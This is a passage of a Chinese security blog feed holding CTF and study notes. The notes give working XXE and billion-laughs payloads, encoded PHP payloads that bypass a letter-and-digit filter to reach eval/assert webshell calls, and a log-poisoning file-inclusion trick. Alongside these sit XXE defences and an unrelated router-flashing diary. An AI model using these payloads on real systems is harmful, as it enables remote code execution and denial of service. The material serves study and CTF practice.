"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;">]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre class="language-java" data-language="java"><code class="language-java">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre class="language-python" data-language="python"><code class="language-python">from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</code></pre><p><strong>过滤用户提交的XML数据</strong></p><p>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p><p><strong>不允许XML中含有自己定义的DTD</strong></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a></li><li><a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></li><li><a href="https://blog.blankshell.com/2020/06/09/xxe%e8%af%a6%e7%bb%86%e6%80%bb%e7%bb%93/">XXE知识总结</a></li><li><a href="http://www.suk1.top/2020/03/18/XXElearn/">XXE漏洞学习</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer-yDPOJgUX&quot; class=&quot;aplayer aplayer-tag-marker meting-tag-marker&quot; data-id=&quot;5174564734&quot; data-server=&quot;netease&quot; data-type=&quot;playlist&quot; data-mode=&quot;circulation&quot; data-autoplay=&quot;false&quot; data-mutex=&quot;true&quot; data-listmaxheight=&quot;340px&quot; data-preload=&quot;none&quot; data-theme=&quot;#ad7a86&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="xml" scheme="https://www.extrader.top/tags/xml/"/>
    
      <category term="xxe" scheme="https://www.extrader.top/tags/xxe/"/>
    
      <category term="xpath" scheme="https://www.extrader.top/tags/xpath/"/>
    
  </entry>
  
  <entry>
    <title>PHP无字母数字RCE</title>
    <link href="https://www.extrader.top/posts/a268445b/"/>
    <id>https://www.extrader.top/posts/a268445b/</id>
    <published>2020-08-09T04:22:50.000Z</published>
    <updated>2020-08-09T04:22:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_match(&#39;[a-z0-9]/is&#39;, $exp)</code></p><a id="more"></a><p>测试代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;exp&#39;])) &#123;          eval($_GET[&#39;exp&#39;]);    &#125;</code></pre><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">echo urlencode(~&#39;exp&#39;);</code></pre><p>payload</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">echo urlencode(~&#39;phpinfo&#39;); (~%8F%97%8F%96%91%99%90)();  &#x3D;&#x3D;&gt;  phpinfo();echo urlencode(~&#39;assert&#39;);echo urlencode(~&#39;(eval($_POST[&quot;a&quot;]))&#39;);(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  &#x3D;&#x3D;&gt;  assert(&#39;eval($_POST[&quot;a&quot;])&#39;)</code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124140760.png" alt loading="lazy"></p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 跑出非字母数字异或得到的 $str$str &#x3D; &#39;GET&#39;;$exp1 &#x3D; &#39;&#39;;$exp2 &#x3D; &#39;&#39;;for ($k &#x3D; 0; $k &lt; strlen($str); $k++) &#123;    $flag &#x3D; 0;    for ($i &#x3D; 0; $i &lt; 128; $i++) &#123;        if (($i &gt;&#x3D; 48 &amp;&amp; $i &lt;&#x3D; 57) || ($i &gt;&#x3D; 65 &amp;&amp; $i &lt;&#x3D; 90) || ($i &gt;&#x3D; 97 &amp;&amp; $i &lt;&#x3D; 122)) &#123;            continue;        &#125;        for ($j &#x3D; 0; $j &lt; 128; $j++) &#123;            if (($j &gt;&#x3D; 48 &amp;&amp; $j &lt;&#x3D; 57) || ($j &gt;&#x3D; 65 &amp;&amp; $j &lt;&#x3D; 90) || ($j &gt;&#x3D; 97 &amp;&amp; $j &lt;&#x3D; 122)) &#123;                continue;            &#125;            if ((chr($i) ^ chr($j)) &#x3D;&#x3D;&#x3D; $str[$k]) &#123;                $exp1 &#x3D; $exp1.urlencode(chr($i));                $exp2 &#x3D; $exp2.urlencode(chr($j));                $flag &#x3D; 1;                break;            &#125;        &#125;        if($flag &#x3D;&#x3D;&#x3D; 1)&#123;            break;        &#125;    &#125;&#125;echo $exp1.&#39;^&#39;.$exp2.&quot;\n&quot;;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo&#x3D;&#x3D;&gt;  phpinfo()$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])&#x3D;&#x3D;&gt;  assert(&quot;eval($_POST[&#39;a&#39;])&quot;)</code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124757860.png" alt loading="lazy"></p><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$_&#x3D;[].[]; &#x2F;&#x2F;俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray$__&#x3D;&#39;&#39;;  &#x2F;&#x2F;两个短杠赋值为空$_&#x3D;$_[&#39;&#39;];&#x2F;&#x2F;从arrayarray中取首字符，即a。这里$_&#x3D;$_[0]也是一样的道理，不过waf限制数字输入$_&#x3D;++$_; &#x2F;&#x2F;b$_&#x3D;++$_; &#x2F;&#x2F;c$_&#x3D;++$_; &#x2F;&#x2F;d$_&#x3D;++$_; &#x2F;&#x2F;e$__.&#x3D;$_; &#x2F;&#x2F;E  把两个短杠赋值为E$_&#x3D;++$_; &#x2F;&#x2F;F  一个短杠继续自增$_&#x3D;++$_; &#x2F;&#x2F;G $__&#x3D;$_.$__; &#x2F;&#x2F; GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE$_&#x3D;++$_; &#x2F;&#x2F;H 此处一个短杠继续自增，为H$_&#x3D;++$_; &#x2F;&#x2F;I$_&#x3D;++$_; &#x2F;&#x2F;J$_&#x3D;++$_; &#x2F;&#x2F;k$_&#x3D;++$_; &#x2F;&#x2F;L$_&#x3D;++$_; &#x2F;&#x2F;M$_&#x3D;++$_; &#x2F;&#x2F;N$_&#x3D;++$_; &#x2F;&#x2F;O$_&#x3D;++$_; &#x2F;&#x2F;P$_&#x3D;++$_; &#x2F;&#x2F;Q$_&#x3D;++$_; &#x2F;&#x2F;R$_&#x3D;++$_; &#x2F;&#x2F;S$_&#x3D;++$_; &#x2F;&#x2F;T$__.&#x3D;$_; &#x2F;&#x2F; GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.&#x3D;拼接，构成get$&#123;&#39;_&#39;.$__&#125;[_]($&#123;&#39;_&#39;.$__&#125;[__]); &#x2F;&#x2F; 进行拼接，$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]);url编码后：%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$_&#x3D;[];$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];$___&#x3D;$_; &#x2F;&#x2F; A$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__; &#x2F;&#x2F; S$___.&#x3D;$__; &#x2F;&#x2F; S$__&#x3D;$_;$__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);url编码后：%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</code></pre><p>注意这两个payload利用的话要php版本小于7才能成功利用，</p><blockquote><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来<code>getshell</code>。</p></blockquote><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809170716430.png" alt loading="lazy"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li><li><a href="https://xz.aliyun.com/t/7181">通过一道代码审计题目来练习无数字字母构造webshell</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件&lt;/strong&gt;：&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制条件&lt;/strong&gt;：&lt;code&gt;preg_match(&amp;#39;[a-z0-9]/is&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>路由器折腾小记</title>
    <link href="https://www.extrader.top/posts/4704f692/"/>
    <id>https://www.extrader.top/posts/4704f692/</id>
    <published>2020-08-06T04:27:18.000Z</published>
    <updated>2020-08-06T04:27:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文记录我（纯小白）这几天折腾路由器的大致过程，备忘用</p><h4 id="物色路由器"><a href="#物色路由器" class="headerlink" title="物色路由器"></a>物色路由器</h4><p>因为从来没玩过，而且家里好几年前的路由器是时候改换了，于是就准备换台，当初只是单纯的想换台路由器提升提升家里的WiFi信号的网速，都已经在jd上选好了一台水星的，但因为一直在学校迟迟没有买，后来发现了路由器的各种玩法，刷固件fq，解锁某云灰色music之类的，就开始在网上各种资料和固件，也慢慢的在物色一款路由器（原来选中的水星的那个网上资料少，官方好像不支持固件切换），一直在小米和newifi3之间徘徊，最后选择了联想的newifi3，结果无线翻车了，现在后悔了当时为什么没有看到k2p，┭┮﹏┭┮，无线信号是真的差，刷了openwrt后居然赶不上我家原来的老路由器，心态炸了。。。</p><p>但是。。。炸归炸，用还是有用的，虽然无线不咋地，当其他方面用用可以的，支持usb，512M的内存</p><h4 id="刷不死breed"><a href="#刷不死breed" class="headerlink" title="刷不死breed"></a>刷不死breed</h4><p>先下好不死breed固件，这个网上很多</p><p>然后本地搭一个web服务器，把文件放上面，然后在路由器终端了里就可以用wget下载了</p><pre class="language-bash" data-language="bash"><code class="language-bash">ssh root@192.168.99.1cd &#x2F;tmpwget http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;newifi-d2-jail-break.koinsmod newifi-d2-jail-break.ko</code></pre><p>随后SSH 会停止响应，因为 newifi-d2-jail-break.ko 会冻结系统的其他功能，强制写入 Newifi D2 专用版 Breed 到 Flash</p><p>然后把路由器电源拔了之后按住reset按钮再插上电源直到只有电源等开始闪烁再松开电源，浏览器输入192.168.1.1即可进入breed web管理界面，再在这里面将原来的eeprom和编程器备份一下，再刷入自己想要的第三方固件（bin文件）</p><p>刷这个breed的原因是因为我们在刷第三方固件的时候如果没操作好，固件切换出了差错的话，路由器就变砖了，为了避免这种情况，就有大神做出了这个breed，相当于一个uboot引导加载程序</p><h4 id="刷第三方固件"><a href="#刷第三方固件" class="headerlink" title="刷第三方固件"></a>刷第三方固件</h4><p>这里我试了好几个，最后选择了esir大神的openwrt固件，这里可以下载： <a href="https://openwrt.club/dl">https://openwrt.club/dl</a> </p><p>选择里面的<code>openwrt-ramips-mt7621-d-team_newifi-d2-squashfs-sysupgrade.bin</code>文件刷入后等待路由器重启，重启完成后输入192.168.1.1即可进入openwrt管理界面</p><h4 id="刷openclash"><a href="#刷openclash" class="headerlink" title="刷openclash"></a>刷openclash</h4><p>下载地址 <a href="https://github.com/vernesong/OpenClash/releases">https://github.com/vernesong/OpenClash/releases</a></p><p>下好ipk文件，ssh连上路由器，执行以下命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">cd &#x2F;tmp opkg updateopkg install coreutils-nohup bash iptables dnsmasq-full curl jsonfilter ca-certificates ipset ip-full iptables-mod-tproxywget https:&#x2F;&#x2F;github.com&#x2F;vernesong&#x2F;OpenClash&#x2F;releases&#x2F;download&#x2F;v0.39.6-beta&#x2F;luci-app-openclash_0.39.6-beta_all.ipkopkg install luci-app-openclash_0.39.6-beta_all.ipk</code></pre><p>然后刷新一下页面就可以在服务里面看到openclash了，剩下的配置工作就要自己操作了</p><p>另外这个版本的自带解锁网易云灰色音乐的功能，直接开启就可以了</p><h4 id="自己编译openwrt"><a href="#自己编译openwrt" class="headerlink" title="自己编译openwrt"></a>自己编译openwrt</h4><p>注意：</p><ol><li><strong>不</strong>要用 <strong>root</strong> 用户来 git 和编译！！！</li><li>国内用户编译前最好准备好梯子</li><li>默认登陆IP 192.168.1.1, 密码 password</li></ol><p>需要Ubuntu 18 LTS x64环境</p><pre class="language-bash" data-language="bash"><code class="language-bash">sudo apt-get updatesudo apt-get -y install build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3.5 python2.7 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf</code></pre><p>然后下载openwrt的源代码</p><pre class="language-bash" data-language="bash"><code class="language-bash">git clone https:&#x2F;&#x2F;github.com&#x2F;Lienol&#x2F;openwrtcd openwrt&#x2F;packagegit clone https:&#x2F;&#x2F;github.com&#x2F;kenzok8&#x2F;openwrt-packages.gitcd ...&#x2F;scripts&#x2F;feeds clean.&#x2F;scripts&#x2F;feeds update -a.&#x2F;scripts&#x2F;feeds install -amake menuconfig</code></pre><p>然后就是配置编译选项了</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">如果是newifi3则：Target System选择 <span class="token string">"MediaTek Ralink MIPS"</span>Subtarget选择<span class="token string">"MT7621"</span>Target Profile选择<span class="token string">"Newifi D2"</span></code></pre><p>我们希望有web界面，还需在<code>LuCI ---&gt; Collections</code>选项中选上<code>luci</code></p><p>在<code>LuCI ---&gt; Applications</code>选择要添加的插件应用。</p><p>在<code>LuCI ---&gt; Themes</code>中设置要安装的主题。</p><p><code>make -j8 download v=s</code> 下载dl库</p><p>输入 <code>make -j1 V=s</code> （<code>-j</code> 后面的数字1是线程数。第一次编译推荐用单线程）即可开始编译你要的固件了。</p><p>编译完成后输出路径：<code>openwrt/bin/targets</code></p><p>第二次编译：</p><pre class="language-bash" data-language="bash"><code class="language-bash">cd ledegit pull.&#x2F;scripts&#x2F;feeds update -a &amp;&amp; .&#x2F;scripts&#x2F;feeds install -amake defconfigmake -j8 downloadmake -j$(($(nproc) + 1)) V&#x3D;s</code></pre><p>如果需要重新配置：</p><pre class="language-bash" data-language="bash"><code class="language-bash">rm -rf .&#x2F;tmp &amp;&amp; rm -rf .configmake menuconfigmake -j$(($(nproc) + 1)) V&#x3D;s</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://cloud.tencent.com/developer/article/1614849">编译自己的openwrt固件 附编译好的newifi3固件</a></li><li><a href="https://mianao.info/2020/03/01/轻松编译Openwrt固件支持V2ray和Trojan-上篇">轻松编译Openwrt固件支持V2ray和Trojan-上篇</a></li><li><a href="https://mianao.info/2020/03/02/%E8%BD%BB%E6%9D%BE%E7%BC%96%E8%AF%91Openwrt%E5%9B%BA%E4%BB%B6%E6%94%AF%E6%8C%81V2ray%E5%92%8CTrojan-%E4%B8%8B%E7%AF%87">轻松编译Openwrt固件支持V2ray和Trojan-下篇</a></li><li><a href="https://mianao.info/2020/05/05/%E7%BC%96%E8%AF%91%E6%9B%B4%E6%96%B0OpenWrt-PassWall%E5%92%8CSSR-plus%E6%8F%92%E4%BB%B6">编译更新OpenWrt PassWall和SSR-plus插件</a></li><li><a href="https://github.com/kenzok8/openwrt-packages">openwrt-packages</a></li><li><a href="https://github.com/Lienol/openwrt">openwrt</a></li><li><a href="https://github.com/coolsnowwolf/lede">lede</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文记录我（纯小白）这几天折腾路由器的大致过程，备忘用&lt;/p&gt;
&lt;h4 id=&quot;物色路由器&quot;&gt;&lt;a href=&quot;#物色路由器&quot; class=&quot;headerlink&quot; title=&quot;物色路由器&quot;&gt;&lt;/a&gt;物色路由器&lt;/h4&gt;&lt;p&gt;因为从来没玩过，而且家里好几年前的路由器是时候
      
    
    </summary>
    
    
      <category term="杂七杂八" scheme="https://www.extrader.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="折腾" scheme="https://www.extrader.top/tags/%E6%8A%98%E8%85%BE/"/>
    
      <category term="路由器" scheme="https://www.extrader.top/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW-WEB_AK赛</title>
    <link href="https://www.extrader.top/posts/f7521cf/"/>
    <id>https://www.extrader.top/posts/f7521cf/</id>
    <published>2020-08-03T13:10:31.000Z</published>
    <updated>2020-08-03T13:10:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>在菜鸡的道路上越走越远。。。淦！</p><a id="more"></a><h3 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    if(preg_match(&#39;&#x2F;php&#x2F;i&#39;, $file))&#123;        die(&#39;error&#39;);    &#125;else&#123;        include($file);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p><code>?file=/flag.txt</code>直接出答案。。这算个非预期解吧</p><p>另外的解法：文件包含Nginx日志文件、</p><p><code>?file=/var/log/nginx/access.log</code>可读日志文件内容，里面包含用户访问的UA信息</p><p>于是</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200803211650015.png" alt loading="lazy"></p><p>尝试命令执行</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK赛/image-20200803211626102.png" alt="image-20200803211626102" loading="lazy"><p>随后<code>cat /flag.txt</code>即可</p><h3 id="Web1-观字"><a href="#Web1-观字" class="headerlink" title="Web1_观字"></a>Web1_观字</h3><p>题目给出源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php#flag in http:&#x2F;&#x2F;192.168.7.68&#x2F;flagif(isset($_GET[&#39;url&#39;]))&#123;    $url &#x3D; $_GET[&#39;url&#39;];    $protocol &#x3D; substr($url, 0,7);    if($protocol!&#x3D;&#39;http:&#x2F;&#x2F;&#39;)&#123;        die(&#39;仅限http协议访问&#39;);    &#125;    